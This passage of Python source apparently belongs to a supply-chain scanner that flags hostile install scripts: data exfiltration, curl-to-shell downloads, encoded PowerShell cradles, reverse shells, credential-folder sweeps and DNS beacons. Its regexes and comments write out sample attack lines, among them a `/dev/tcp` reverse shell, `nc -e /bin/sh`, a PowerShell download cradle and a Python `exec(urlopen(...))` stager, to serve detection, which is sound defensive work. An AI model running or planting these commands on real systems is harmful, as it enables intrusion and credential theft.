    """[(kind, what)]: the local data one command prints; None for a filter
    whose output is what is piped into it. `shvars`: the shell variables
    the text assigned local data (what `echo $V` prints)."""
    p, name, _status = _sh_program(cmd)
    if p is None:
        return []
    args = cmd.words[p + 1:]
    positional = [a for a in args if a and a[0] != "-"]
    if name == "uname":
        return [("identity", "uname")] if any(a in ("--all", "--nodename") or _SH_FLAG_A_OR_N_RE.match(a)
                                             for a in args) else []
    if name in _SH_IDENTITY:
        return [("identity", name)]
    if name == "env" or name == "printenv" or name in _SH_ENVIRONMENT and not positional:
        return [("environment", _LD_WHOLE_ENV)]
    for op, target in cmd.redirs:
        if op == "<" or op == "<>":
            return [("file", target)]
    if name in _SH_FILE_READERS or name in _SH_FILTERS:
        files = positional[1:] if name in _SH_SCRIPTED_FILTERS else ([] if name in ("tr", "openssl") else positional)
        if files:
            return [("file", files[-1])]
        return None if name in _SH_FILTERS else []
    if name in _SH_LISTINGS:
        return [("report", name)]
    if name in _SH_ECHO:
        out = []
        for word, subs in zip(cmd.words[p + 1:], cmd.subs[p + 1:]):
            out.extend(_sh_word_data(word, subs, depth, False, shvars))
        return out
    if name in _SH_HTTP:                            # what the cloud gives the machine; its public IP address
        if any(_LD_METADATA_RE.search(a) is not None for a in args):
            return [("credentials", "the instance's metadata")]
        if any(_LD_PUBLIC_IP_RE.search(a) is not None for a in args):
            return [("address", "the machine's public IP address")]
    return []


def _sh_assignments(cmd, depth, shvars):
    """Records in `shvars` the local data the shell variables a command
    assigns hold (`T=$(…)` alone or in front of a command, `export T=$(…)`):
    what the substitutions of the value print, and the variables it names."""
    words, k = cmd.words, 0
    while k < len(words) and _ENV_ASSIGN_RE.match(words[k]):
        k += 1
    at = list(range(k))
    if k < len(words) and _sh_name(words[k]) in _SH_DECLARE:
        at.extend(j for j in range(k + 1, len(words)) if _ENV_ASSIGN_RE.match(words[j]))
    for j in at:
        name, _eq, value = words[j].partition("=")
        data = []
        for sub in cmd.subs[j]:
            data.extend(_sh_output_data(sub, depth + 1, shvars))
        data.extend(_sh_word_data(value, (), depth, False, shvars))
        if data:
            shvars[name] = data
        else:
            shvars.pop(name, None)


def _sh_remote(address):
    """Is an address a server elsewhere (not loopback, not a reserved name)?"""
    host = _SH_HOST_RE.match(address).group(1).strip("[]").lower().rstrip(".")
    if host in ("", "localhost", "0.0.0.0", "::1") or host.startswith("127."):
        return False
    return host.rsplit(".", 1)[-1] not in _DNS_LOCAL_TLDS


def _sh_request(name, args):
    """What a curl or wget command sends, and where its answer goes: ([(word
    index, 'data' or 'meta')], [uploaded paths], reads its standard input,
    disposition 'file', 'stdout' or 'discard', [(address, word index)])."""
    curl = name == "curl"
    opts, pos = _sh_options(args, _SH_CURL_SHORT_VALUE if curl else _SH_WGET_SHORT_VALUE,
                            _SH_CURL_LONG_VALUE if curl else _SH_WGET_LONG_VALUE)
    sent, uploads, stdin = [], [], False
    disposition = "stdout" if curl else "file"
    writes_out = False
    addresses = [(a, k) for a, k in pos if _SH_URL_RE.match(a)]
    for opt, value, k in opts:
        if value is None:
            if curl and opt in _SH_CURL_REMOTE_NAME:
                disposition = "file"
            elif not curl and opt == "--spider":
                disposition = "discard"
            continue
        if curl and opt == "--url":
            if _SH_URL_RE.match(value):
                addresses.append((value, k))
        elif curl and opt in _SH_CURL_DATA:
            body = value.split("=", 1)[1] if opt in ("-F", "--form") and "=" in value else value
            name_part, at, named = body.partition("@")      # --data-urlencode name@file
            named = opt == "--data-urlencode" and bool(at) and "=" not in name_part
            if named or body[:1] in ("@", "<") and opt not in ("--form-string", "--data-raw", "--url-query"):
                path = body.partition("@")[2] if named else body[1:]
                path = path.split(";", 1)[0]
                if path in ("-", ""):
                    stdin = True
                else:
                    uploads.append(path)
            else:
                sent.append((k, "data"))
        elif not curl and opt in _SH_WGET_DATA:
            sent.append((k, "data"))
        elif curl and opt in _SH_CURL_META or not curl and opt in _SH_WGET_META:
            sent.append((k, "meta"))
        elif curl and opt in _SH_CURL_UPLOAD or not curl and opt in _SH_WGET_UPLOAD:
            if value in ("-", "."):
                stdin = True
            else:
                uploads.append(value)
        elif curl and opt in _SH_CURL_OUTPUT or not curl and opt in _SH_WGET_OUTPUT:
            if value.lower() in _SH_NULL:
                disposition = "discard"
            elif value == "-":
                disposition = "stdout"
            else:
                disposition = "file"
        elif curl and opt in ("-w", "--write-out"):
            writes_out = True
    if disposition == "discard" and writes_out:
        disposition = "stdout"          # what -w writes (the status code …) is the output
    return sent, uploads, stdin, disposition, addresses


def _sh_kept(cmd, in_subst):
    """Is what a command writes to its standard output kept: written to a
    file (not /dev/null), piped on, or the value of a substitution?"""
    for op, target in cmd.redirs:
        if op in (">", ">>", ">|", "&>", "&>>"):
            return target.lower() not in _SH_NULL
    return cmd.pipe_out or in_subst


def _sh_status_used(cmds, k, status):
    """Does what runs next depend on cmds[k]'s exit status (see above)?"""
    if status:
        return True
    cmd = cmds[k]
    if cmd.after not in ("&&", "||") or k + 1 >= len(cmds):
        return False
    return _sh_program(cmds[k + 1])[1] not in _SH_NOOPS


def _sh_reasons(text, depth, in_subst, walk):
    """The reasons a shell text's network commands give (see above)."""
    reasons = []
    if depth > _SH_MAX_DEPTH or not text:
        return reasons
    cmds = _sh_parse(text)
    shvars = {}                         # the shell variables the text assigns local data
    for k, cmd in enumerate(cmds):
        if walk.commands >= HOOK_MAX_COMMANDS:
            walk.complete = False
            break
        walk.commands += 1
        for word_subs in cmd.subs:
            for sub in word_subs:
                for r in _sh_reasons(sub, depth + 1, True, walk):
                    if r not in reasons:
                        reasons.append(r)
        _sh_assignments(cmd, depth, shvars)
        p, name, status = _sh_program(cmd)
        if p is None:
            continue
        args, arg_subs = cmd.words[p + 1:], cmd.subs[p + 1:]
        if name == "read":                          # `… | while read V`: V holds what is piped in
            data = _sh_piped_data(cmds, k, depth, shvars) if cmd.pipe_in else []
            for a in args:
                if _SH_VAR_NAME_RE.match(a):
                    if data:
                        shvars[a] = data
                    else:
                        shvars.pop(a, None)
            continue
        code = _sh_code(name, args)
        if code is not None:
            for r in _sh_reasons(code, depth + 1, in_subst or _sh_kept(cmd, in_subst), walk):
                if r not in reasons:
                    reasons.append(r)
            continue
        piped = []                      # what xargs hands the command as arguments
        if name == "xargs":
            inner = _sh_xargs_command(args)
            if inner is None:
                continue
            if cmd.pipe_in:
                piped = _sh_piped_data(cmds, k, depth, shvars)
            args, arg_subs = args[inner + 1:], arg_subs[inner + 1:]
            name = _sh_name(cmd.words[p + 1 + inner])
        data, beacon = [], False
        if name in _SH_HTTP:
            sent, uploads, stdin, disposition, addresses = _sh_request(name, args)
            if not addresses:
                continue
            kept = disposition == "file" or disposition == "stdout" and _sh_kept(cmd, in_subst)
            for idx, what in sent:
                if idx < len(args):                 # (an option given no value sends nothing)
                    data.extend(_sh_word_data(args[idx], arg_subs[idx], depth, kept and what == "meta", shvars))
            for address, idx in addresses:
                data.extend(_sh_word_data(address, arg_subs[idx], depth, kept, shvars))
            data.extend(("file", path) for path in uploads)
            if stdin and cmd.pipe_in and not piped:
                data.extend(_sh_piped_data(cmds, k, depth, shvars))
            data.extend((kind, what) for kind, what in piped if not kept or kind == "identity")
            beacon = (not kept and not _sh_status_used(cmds, k, status)
                      and any(_sh_remote(address) for address, _idx in addresses))
        elif name in _SH_RAW:
            if cmd.pipe_in:
                data.extend(piped or _sh_piped_data(cmds, k, depth, shvars))
            data.extend(("file", target) for op, target in cmd.redirs if op == "<" or op == "<>")
            hosts = [(a, s) for a, s in zip(args, arg_subs) if a and a[0] != "-" and _SH_URL_RE.match(a)]
            for word, subs in hosts:
                data.extend(_sh_word_data(word, subs, depth, False, shvars))
            beacon = (not _sh_status_used(cmds, k, status) and not _sh_kept(cmd, in_subst)
                      and any(_sh_remote(a) for a, _s in hosts))
        elif name in _SH_LOOKUP:
            data.extend(("lookup-identity" if kind == "identity" else kind, what) for kind, what in piped)
            names = [(a, s) for a, s in zip(args, arg_subs) if a and a[0] != "-" and _SH_URL_RE.match(a)]
            for word, subs in names:
                data.extend(("lookup-identity" if kind == "identity" else kind, what)
                            for kind, what in _sh_word_data(word, subs, depth, False, shvars))
            beacon = (not _sh_status_used(cmds, k, status) and not _sh_kept(cmd, in_subst)
                      and any(_sh_remote(a) for a, _s in names))
        else:
            continue
        for kind, what in data:
            reason = _SH_DATA_REASONS[kind]
            if kind in ("file", "report", "environment"):
                reason += " (" + _sh_literal(what)[:40] + ")"
            if reason not in reasons:
                reasons.append(reason)
        if beacon and not data and _SH_BEACON_REASON not in reasons:
            reasons.append(_SH_BEACON_REASON)
    return reasons


def _hook_inline_code(text, walk, depth=0):
    """The code a shell text hands node (-e, --eval, -p, --print) or python
    (-c) inline, also inside `sh -c`, `eval` and `cmd /c` command lines."""
    out = []
    if depth > _SH_MAX_DEPTH:
        return out
    for cmd in _sh_parse(text):
        if walk.commands >= HOOK_MAX_COMMANDS:
            walk.complete = False
            break
        walk.commands += 1
        p, name, _status = _sh_program(cmd)
        if p is None:
            continue
        args = cmd.words[p + 1:]
        if name in _NODE_NAMES or name in _JS_RUNTIMES:
            code = _node_script(args)[2]
            if code:
                out.append(_sh_literal(code))
        elif _PYTHON_NAME_RE.match(name):
            code = _interpreter_script(args)[1]
            if code:
                out.append(_sh_literal(code))
        else:
            code = _sh_code(name, args)
            if code:
                out.extend(_hook_inline_code(code, walk, depth + 1))
    return out


def hook_command_risk(cmd, output_kept=False):
    """Reasons an install hook's command looks hostile ([] if none), read as
    a program (see above): the install-script test's reasons for the
    command and for the code it hands an interpreter inline, then what its
    network commands do. `output_kept`: what the command prints is used (a
    binding.gyp command expansion's value), so a request it prints is not
    thrown away."""
    if not isinstance(cmd, str) or not cmd.strip() or len(cmd) > HOOK_MAX_CHARS:
        return []
    reasons = install_script_risk(cmd, False, True)
    walk = _HookWalk()
    for code in _hook_inline_code(cmd, walk):
        for r in install_script_risk(code, False):
            if r not in reasons:
                reasons.append(r)
    for r in _sh_reasons(cmd, 0, output_kept, walk):
        if r not in reasons:
            reasons.append(r)
    _label_sends(cmd, reasons)
    return reasons


# ---------------- Install-script and import-time inspection ----------------
# (The registry's tests, here so that --deps project scans run them too.)
# An install hook is a capability; what makes it hostile is what the script it
# runs does. Escalate only on the patterns malicious install scripts share:
# data read from the machine sent over the network (0.1.8: read as a flow;
# a throwaway exfiltration endpoint the script names labels where it goes),
# code fetched and run, a reverse shell, persistence. Downloading a platform
# binary from the registry (esbuild, puppeteer) is none of these, and in
# JavaScript or Python a command is what an exec call is handed (a CLI's
# help text or an error message that shows `curl … | sh` runs nothing). The same test applies to the
# Python code pip runs at install time (an sdist's setup.py, an in-tree PEP 517
# backend) and to shell scripts a hook runs.
_NETWORK_RE = re.compile(
    r"""\b(?:https?\.(?:get|request)|fetch\s*\(|axios|XMLHttpRequest|net\.connect|dns\.resolve|"""
    r"""require\(\s*["'](?:node:)?(?:https?|net|dgram|tls)["']\s*\)|"""
    r"""from\s+["'](?:node:)?(?:https?|net|dgram|tls)["'])"""
    # Python
    r"""|\burllib\.request\b|\burlopen\s*\(|\burlretrieve\s*\(|\bhttp\.client\b|"""
    r"""\bHTTPS?Connection\s*\(|\bsocket\.(?:socket|create_connection)\s*\(|"""
    r"""\brequests\.(?:get|post|put|patch|request|Session)\b|\bimport\s+(?:requests|httpx|aiohttp|urllib3)\b|"""
    r"""\bfrom\s+(?:requests|httpx|aiohttp|urllib3|urllib\.request|http\.client)\s+import\b|"""
    r"""\bhttpx\.\w+\s*\(|\baiohttp\.ClientSession\b|\bsmtplib\b|\bftplib\b"""
    # shell: a download tool pointed at a URL, netcat to a host and port, bash's /dev/tcp.
    # Each option is parsed one way only (a value never starts like an option
    # or the URL) and their number is bounded: the old `(?:-{1,2}[\w-]+(?:[ =]
    # \S+)?\s+)*` could split `--a-b` and pair values two ways, so 18 options
    # took over 20 s, and `curl -a ` x 20000 was quadratic — a hostile install
    # script could hang the scan.
    r"""|\b(?:curl|wget)\s+(?:-{1,2}\w[\w-]*(?:=\S*|\s+(?!-{1,2}\w)(?!["']?https?:)\S+)?\s+){0,24}"""
    r"""["']?https?://"""
    r"""|\b(?:nc|ncat|netcat)\s+(?:-\w+\s+){0,8}[\w.-]+\s+\d{2,5}\b|/dev/tcp/""", re.M)
# RequestBin by its host names only (0.1.8): the bare word is also the start
# of requestBinary(), which chromedriver's and phantomjs-prebuilt's installers
# define to download their binaries.
_EXFIL_SERVICES = (
    r"""pastebin\.com|\bngrok|webhook\.site|"""
    r"""discord(?:app)?\.com/api/webhooks|api\.telegram\.org|oastify\.com|burpcollaborator|"""
    r"""\binteract\.sh|\boast\.(?:pro|live|site|online|fun|me)\b|requestbin\.(?:com|net|io)\b|\brequestb\.in\b|"""
    r"""pipedream\.net|transfer\.sh|\.onion\b""")
_EXFIL_SERVICE_RE = re.compile(_EXFIL_SERVICES, re.I)      # the named ones, no raw IPs
# `curl … | sh` / `wget … | bash`, read in one left-to-right pass: a pipe into
# a shell after curl or wget in the same command (no `|`, `;`, `&` or line
# break between them). The regex it replaces, `\b(?:curl|wget)\b[^\n|;&]*\|…`,
# rescanned the rest of the command from every `curl`, so a line of 100,000
# of them never finished.
_PIPE_SCAN_RE = re.compile(r"""\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|[\n|;&]|\b(?:curl|wget)\b""")


def _pipes_download_to_shell(text):
    download = False
    for m in _PIPE_SCAN_RE.finditer(text):
        token = m.group(0)
        if token[0] == "|" and len(token) > 1:           # | sh, | sudo bash
            if download:
                return True
            download = False
        elif token in ("\n", "|", ";", "&"):
            download = False
        else:                                            # curl / wget
            download = True
    return False


# A download handed to a shell or an interpreter without a pipe: through a
# command substitution (`sh -c "$(curl …)"`, `node -e "$(curl …)"`,
# `eval "$(wget -qO- …)"`) or a process substitution (`source <(curl …)`,
# `bash <(curl …)`). Read one row at a time, as a command is; a row with no
# `$(curl`, `` `curl `` or `<(curl` (or wget) is not searched.
_DL_SUBST_RE = re.compile(
    r"""\b(?:(?:ba|z|da|k)?sh|node(?:js)?|bun|python[\d.]*|perl|ruby|php|pwsh|powershell)(?:\.exe)?"""
    r"""(?:[ \t]+-[\w-]+){0,6}?[ \t]+-(?:c|e|E|p|r|-eval|-print|Command|command)[ \t]+(?:["'][ \t]*)?"""
    r"""(?:\$\(|`)[ \t]*(?:curl|wget)\b"""
    r"""|\beval[ \t]+(?:["'][ \t]*)?(?:\$\(|`)[ \t]*(?:curl|wget)\b"""
    r"""|(?:\b(?:(?:ba|z|da|k)?sh|source|node(?:js)?|python[\d.]*)|(?:^|[ \t;&|(])\.)[ \t]+<\([ \t]*(?:curl|wget)\b""")
_DL_SUBST_NEEDLE_RE = re.compile(r"""(?:\$\(|`|<\()[ \t]*(?:curl|wget)""")


def runs_substituted_download(row):
    """Does this row hand a download to a shell or an interpreter through a
    command or process substitution (see above)?"""
    return (("curl" in row or "wget" in row) and _DL_SUBST_NEEDLE_RE.search(row) is not None
            and _DL_SUBST_RE.search(row) is not None)


# the reason each received-code category adds (see _received_code_kind)
_DL_CATEGORY_REASON = {
    "run": "runs code it receives over the network",
    "deserialize": "deserializes data it receives over the network",
    "import": "loads a module named by data it receives over the network",
}


# ---------------- PowerShell, stagers, reverse shells, host information ----------------
# The install-script blind spots of the audit's PyPI benchmark (0.1.7), each a
# shape a legitimate install script has no use for:
#
# * PowerShell started with an encoded command (-EncodedCommand, or any prefix
#   PowerShell accepts: -e, -ec, -enc, …; base64 of UTF-16LE text): 68 of 200
#   malicious PyPI packages ran `powershell -WindowStyle Hidden -EncodedCommand
#   …` from setup.py to fetch an .exe from Discord's CDN and start it. The
#   command is decoded, and what it does is named when it downloads and runs
#   code. Plain PowerShell that downloads and runs code — a cradle (`irm URL |
#   iex`, `IEX (New-Object Net.WebClient).DownloadString(URL)`) or a download
#   written to a file and started (`Invoke-WebRequest -OutFile f` then
#   `Start-Process f`) — is the same thing unencoded.
# * A script carried in a string literal that downloads and runs code: a
#   setup.py that writes `b"""from urllib.request import urlopen as u;exec(u(
#   'https://…').read())"""` to a temporary file and starts it with pythonw.
#   The literal's text is read as code (its `;`-separated statements one per
#   line) by the received-code test.
# * A reverse shell: a socket's descriptor made a shell's standard streams
#   (`os.dup2(s.fileno(), 0)` … `subprocess.call(["/bin/sh", "-i"])`),
#   `bash -i >& /dev/tcp/HOST/PORT 0>&1`, `nc -e /bin/sh`, or a spawned shell
#   piped to a net.Socket.
# * The machine's user or host name (or the output of whoami, hostname,
#   ifconfig …) collected in a script that sends data over the network: the
#   dependency-confusion beacon.
_PS_RE = re.compile(r"\b(?:powershell|pwsh)(?:\.exe)?\b", re.I)
_PS_ENCODED_RE = re.compile(
    r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,400}?[\s\"',\[(][-/\u2013\u2014]"
    r"(?:encodedcommand|encodedcomman|encodedcomma|encodedcomm|encodedcom|encodedco|encodedc|encoded|encode"
    r"|encod|enco|enc|en|ec|e)[\s\"',]+([A-Za-z0-9+/]{16}[A-Za-z0-9+/]*={0,2})", re.I)
_PS_ENCODED_MAX = 65536          # base64 characters of one command that are decoded
_PS_CRADLE_RE = re.compile(
    r"\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|curl|wget)\b[^\n|;]{0,400}\|\s*(?:iex|Invoke-Expression)\b"
    r"|\b(?:iex|Invoke-Expression)\b[\s(]{0,8}(?:New-Object\s+(?:System\.)?Net\.WebClient\s*\)\s*\.\s*DownloadString"
    r"|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b"
    r"|\.DownloadString\s*\([^\n)]{0,400}\)\s*\|\s*(?:iex|Invoke-Expression)\b", re.I)
_PS_DOWNLOAD_FILE_RE = re.compile(
    r"\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl(?:\.exe)?|wget|Start-BitsTransfer)\b[^\n]{0,400}?"
    r"\s-(?:OutFile|Destination|o)\b|\.DownloadFile\s*\(", re.I)
_PS_START_RE = re.compile(r"\b(?:Start-Process|saps|Invoke-Item|Invoke-Expression|iex)\b", re.I)


def _powershell_script_risk(ps):
    """What PowerShell text `ps` does that an install script should not:
    'downloads and runs code' or None."""
    if _PS_CRADLE_RE.search(ps) or (_PS_DOWNLOAD_FILE_RE.search(ps) and _PS_START_RE.search(ps)):
        return "downloads and runs code"
    return None


def _decode_powershell(b64):
    """The UTF-16LE text of an -EncodedCommand argument ('' when it is not
    base64): the first _PS_ENCODED_MAX characters, padded, an odd last byte
    dropped."""
    b64 = b64[:_PS_ENCODED_MAX]
    b64 = b64[:len(b64) - len(b64) % 4] if b64.endswith("=") else b64 + "=" * (-len(b64) % 4)
    try:
        data = base64.b64decode(b64, validate=True)
    except (ValueError, TypeError):
        return ""
    return data[:len(data) // 2 * 2].decode("utf-16-le", "replace")


def powershell_risk(text):
    """Reasons PowerShell in `text` looks hostile (see above), [] if none."""
    if not _PS_RE.search(text):
        return []
    reasons = []
    for m in _PS_ENCODED_RE.finditer(text):
        does = _powershell_script_risk(_decode_powershell(m.group(1)))
        reasons.append("runs an encoded PowerShell command" + (f" that {does}" if does else ""))
        break
    if not reasons:
        does = _powershell_script_risk(text)
        if does:
            reasons.append(f"runs PowerShell that {does}")
    return reasons


_STAGER_MIN = 24                 # characters of a literal worth reading as a script
_STAGER_MAX_LITERALS = 2000      # literals examined per text
_STAGER_RUN_NEEDLES = ("exec", "eval", "Function", "system", "popen", "spawn", "-c")
_STAGER_NET_NEEDLES = ("urlopen", "requests", "urllib", "http", "fetch", "curl", "wget", "socket")


def _string_literals(text):
    """(offset, contents) of the string literals of `text` ('…', "…", `…`
    and Python's triple-quoted forms; escapes are skipped, not decoded; a
    one-quote literal ends at its line), in order, at most
    _STAGER_MAX_LITERALS of them. One pass."""
    out, i, n = [], 0, len(text)
    while i < n and len(out) < _STAGER_MAX_LITERALS:
        ch = text[i]
        if ch not in "\"'`":
            i += 1
            continue
        if ch != "`" and text.startswith(ch * 3, i):
            j = text.find(ch * 3, i + 3)
            end = n if j < 0 else j
            out.append((i, text[i + 3:end]))
            i = end + 3
            continue
        j = i + 1
        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
            j += 2 if text[j] == "\\" else 1
        out.append((i, text[i + 1:min(j, n)]))
        i = j + 1
    return out


def stager_at(text):
    """The offset of a string literal of `text` that holds a script that
    downloads and runs code (see above), else -1."""
    if not any(nd in text for nd in _STAGER_NET_NEEDLES):
        return -1
    for at, lit in _string_literals(text):
        if (len(lit) >= _STAGER_MIN and any(nd in lit for nd in _STAGER_RUN_NEEDLES)
                and any(nd in lit for nd in _STAGER_NET_NEEDLES)):
            found = _received_code_kind(lit.replace(";", "\n"))
            if found is not None and found[1] == "run":
                return at
    return -1


_REVSHELL_DUP2_RE = re.compile(r"\bdup2\s*\(\s*[\w.]+\.fileno\s*\(\s*\)\s*,\s*[012]\s*\)")
_REVSHELL_SHELL_RE = re.compile(r"""["'](?:/bin/(?:ba|z|da|k)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']|\bpty\.spawn\s*\(""")
_REVSHELL_LINE_RE = re.compile(
    r"\b(?:ba|z|k)?sh\s+-i\b[^\n]{0,80}?[<>]&?\s*/dev/(?:tcp|udp)/"
    r"|/dev/(?:tcp|udp)/[\w.\-]+/\d+[^\n]{0,40}?0\s*>\s*&\s*1"
    r"|\b(?:nc|ncat|netcat)\b[^\n]{0,120}?\s-[ec]\s+[\"']?(?:/bin/)?(?:ba|z)?sh\b")
_REVSHELL_JS_SPAWN_RE = re.compile(r"""\bspawn\s*\(\s*["'](?:/bin/(?:ba|z)?sh|cmd(?:\.exe)?)["']""")
_REVSHELL_JS_PIPE_RE = re.compile(r"\.pipe\s*\(\s*[\w$.]+\.stdin\s*\)")
_REVSHELL_JS_NET_RE = re.compile(r"\bnet\s*\.\s*(?:Socket|connect|createConnection)\b|\bnew\s+Socket\s*\(")


def reverse_shell_at(text):
    """The offset where `text` opens a reverse shell (see above), else -1."""
    m = _REVSHELL_LINE_RE.search(text)
    if m:
        return m.start()
    if "dup2" in text:
        m = _REVSHELL_DUP2_RE.search(text)
        if m and _REVSHELL_SHELL_RE.search(text):
            return m.start()
    if "pty" in text and "socket" in text and "connect" in text and "pty.spawn" in text:
        return text.index("pty.spawn")
    if "spawn" in text:
        m = _REVSHELL_JS_SPAWN_RE.search(text)
        if m and _REVSHELL_JS_PIPE_RE.search(text) and _REVSHELL_JS_NET_RE.search(text):
            return m.start()
    # an argument list (`spawn('nc', [host, port, '-e', '/bin/sh'])`), or a
    # shell or netcat run with an ngrok TCP address (0.1.8)
    if any(nd in text for nd in _REVSHELL_ARGS_NEEDLES):
        m = _REVSHELL_ARGS_RE.search(text)
        if m:
            return m.start()
    if any(nd in text for nd in _REVSHELL_NGROK_NEEDLES):
        m = _REVSHELL_NGROK_TCP_RE.search(text)
        if m and _REVSHELL_ARG_SHELL_RE.search(text) and _EXEC_CALL_RE.search(text):
            return m.start()
    return -1


_HOST_INFO_RE = re.compile(
    r"\b(?:socket\.gethostname|socket\.getfqdn|platform\.node|getpass\.getuser|os\.getlogin|pwd\.getpwuid"
    r"|os\.hostname|os\.userInfo)\s*\("
    r"""|\b(?:getoutput|check_output|getstatusoutput|execSync|popen)\s*\(\s*\[?\s*["'](?:whoami|hostname|id"""
    r"""|uname\s+(?:-[A-Za-z]*[an]|--(?:all|nodename))|ifconfig|ipconfig|systeminfo)\b"""
    r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname\s+(?:-[A-Za-z]*[an]|--(?:all|nodename))|ifconfig|ip\s+a|pwd|ls"
    r"|cat\s+/etc/passwd|ps)\b"
    r"|\bos\.(?:hostname|userInfo)\s*[,)]"
    # (uname counts with -a or -n, which print the host name: a bare uname,
    # -s or -m names the platform a download is chosen for, 0.1.8)
    # (0.1.8) read through the module itself or a name taken from it:
    # require('os').hostname(), const { hostname } = require('os'),
    # import { userInfo } from 'node:os', from socket import gethostname
    r"""|\brequire\(\s*["'](?:node:)?os["']\s*\)\s*\.\s*(?:hostname|userInfo)\b"""
    r"""|\b(?:const|let|var|import)\s*\{[^{}\n]{0,200}\b(?:hostname|userInfo)\b[^{}\n]{0,200}\}\s*"""
    r"""(?:=\s*require\(\s*|from\s*)["'](?:node:)?os["']"""
    r"|\bfrom\s+(?:socket|getpass)\s+import\s+[^\n]{0,200}\b(?:gethostname|getfqdn|getuser)\b")


# Exfiltration shapes (0.1.8, from the rerun's misses that GuardDog caught).
# Each one is strong wherever it is found — in an install script, in code
# that runs on import, in the files a package runs when used — and none
# was found in the benchmark's 429 popular packages:
# - A request to a webhook whose secret is written in the code
#   (secret_endpoint_at, 0.1.8 for any service; 0.1.7 knew Telegram's,
#   Discord's and Slack's shapes). A library that talks to such a service
#   takes the key from its user; a package that ships its author's key
#   reports whoever runs it to the author (figlets zips Exodus wallets and
#   sends them to its bot; requestn uploads every file in the working
#   folder).
# - Several credential folders named in one place (.ssh, .aws, .ethereum,
#   .kube …: three or more within _CRED_SWEEP_SPAN characters) in a file
#   that makes network calls: a sweep of the home folder for secrets.
# - The machine's user or host name sent to an address the file keeps
#   base64-encoded (a literal that decodes to "http…"), or looked up in DNS
#   inside a name the code builds (the dependency-confusion DNS beacon).
# (0.1.8: an address a list names — a data-capture or exfiltration service,
# ipify's answer sent to one — is where data goes, not a sign it goes: the
# local data's flow is read, local_data_sent_at, and the list names the
# destination.)
# - A reverse shell given to an exec call as an argument list, or to an
#   ngrok TCP address (`spawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', …])`).
# - At install time only: a raw socket to a hard-coded IP address, as the
#   test already reads a URL with one (loopback, and the public DNS
#   resolvers a connectivity check uses, are not one).
# - A cryptocurrency miner: a Monero wallet address in a file that runs a
#   program with a mining pool's arguments (`-o pool:port`, stratum+tcp://,
#   --donate-level, xmrig) — ultralytics 8.3.42 ran XMRig from safe_run().
# A webhook whose secret is written in the code (0.1.8): an http(s) URL in
# a string literal whose path carries a credential — a segment of 20 to
# 200 letters, digits, '_', '-' and ':' that mixes upper case, lower case
# and digits and uses _SE_MIN_DISTINCT distinct characters (a bot's token,
# a webhook's key; a content hash is hex, a slug lower case, an id digits),
# a template's or an f-string's hole in it read as the literal its name is
# given (`bot{TOKEN}`). A request given
# the address, or a name given it (followed as local data is: assignments,
# the parameters of the script's own functions), sends data to whoever
# holds the credential: fetch, urlopen, Request, axios, got, sendBeacon, a
# client's get/post/put/patch/request/send, an XMLHttpRequest's open, or a
# command a script runs that holds curl or wget.
_SE_URL_RE = re.compile(r"""https?://([^\s"'`<>/?#]{1,300})([^\s"'`<>?#]{0,600})""")
_SE_SEGMENT_RE = re.compile(r"[A-Za-z0-9_:-]{20,200}")
_SE_HOLE_RE = re.compile(r"\$\{\s*([A-Za-z_$][\w$]*)\s*\}|\{\s*([A-Za-z_]\w*)\s*\}")
_SE_REQUEST_RE = re.compile(
    r"\b(?:fetch|urlopen|Request|sendBeacon|axios|got|ky|needle|superagent)\s*\("
    r"|\.\s*(?:get|post|put|patch|request|send|open)\s*\(")
_SE_NEEDLES = ("fetch", "urlopen", "Request", "sendBeacon", "axios", "got", "ky", "needle", "superagent", ".get",
               ".post", ".put", ".patch", ".request", ".send", ".open", "curl", "wget")
_SE_MIN_DISTINCT = 10            # distinct characters a real secret has
_SE_MAX = 200                    # literals, names and requests examined per text
_CRED_DIR_RE = re.compile(
    r"""["'`](?:~[/\\]|\$HOME[/\\]|%USERPROFILE%[/\\])?\.(ssh|aws|azure|gnupg|docker|kube|ethereum|electrum|bitcoin"""
    r"""|solana|npmrc|pypirc|netrc|git-credentials|config[/\\]gcloud|password-store|vault-token|terraform\.d)"""
    r"""(?:[/\\][^"'`\n]{0,60})?["'`]""")
_CRED_SWEEP_NEEDLES = (".ssh", ".aws", ".azure", ".gnupg", ".docker", ".kube", ".ethereum", ".electrum", ".bitcoin",
                       ".solana", ".npmrc", ".pypirc", ".netrc", ".git-credentials", ".config", ".password-store",
                       ".vault-token", ".terraform.d")
_CRED_SWEEP_SPAN = 400           # characters the credential folders are named within
_CRED_SWEEP_MIN = 3              # distinct credential folders that make a sweep
_CRED_SWEEP_MAX = 200            # folder names examined per text
_B64_URL_LITERAL_RE = re.compile(r"""["'`]aHR0c[A-Za-z0-9+/]{2,}={0,2}["'`]""")
# The DNS beacon: a lookup of a name the code builds from values and a
# literal domain. The name is the lookup's first argument (at most
# _DNS_ARG_SPAN characters; the first _DNS_LOOKUP_MAX lookups of a text are
# read): an f-string or a template literal with a field (`f"{h}.x.com"`), a
# sum whose last term is the domain's literal (`h + '.x.com'`), a %-format
# or a str.format() of one (`'%s.x.com' % h`), or a name assigned one of
# those earlier on (`q = h + '.x.com'` … `lookup(q)`: the last assignment
# of the name within _DNS_ASSIGN_SPAN characters before the lookup). A shell
# command may look the name up too (nslookup, dig, host, ping,
# Resolve-DnsName, or curl or wget of a URL) when its host holds the
# identity itself — `$(whoami)`, `` `hostname` ``, $USER, %USERNAME%,
# $env:COMPUTERNAME … — so no other read of it is needed there. The domain
# is a literal that ends in a top-level name, not a reserved one: a machine
# looking itself up on its own network (`gethostname() + '.local'`) sends
# nothing out.
_DNS_CALL_RE = re.compile(
    r"""(?:\b(?:getaddrinfo|gethostbyname(?:_ex)?)|\bdns\.(?:promises\.)?(?:resolve\w*|lookup)"""
    r"""|\bresolver\.(?:resolve|query))\s*\(""")
_DNS_TEMPLATE_RE = re.compile(r"""\A(?:f"([^"\n]{0,300})"|f'([^'\n]{0,300})'|`([^`\n]{0,300})`)""")
_DNS_BUILT_NAME_RE = re.compile(r"\{[^}\n]+\}[^\n]*\.([A-Za-z]{2,})\Z")
